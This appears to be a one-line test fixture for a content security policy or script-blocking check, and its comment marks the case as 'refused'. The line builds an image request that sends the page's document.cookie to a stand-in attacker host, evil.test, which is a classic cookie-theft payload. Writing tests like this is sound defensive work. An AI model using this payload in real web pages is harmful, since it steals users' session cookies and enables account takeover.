// script-img-src-computed
const image = new Image(); image.src = "https://evil.test/?" + document.cookie; // refused: script-url
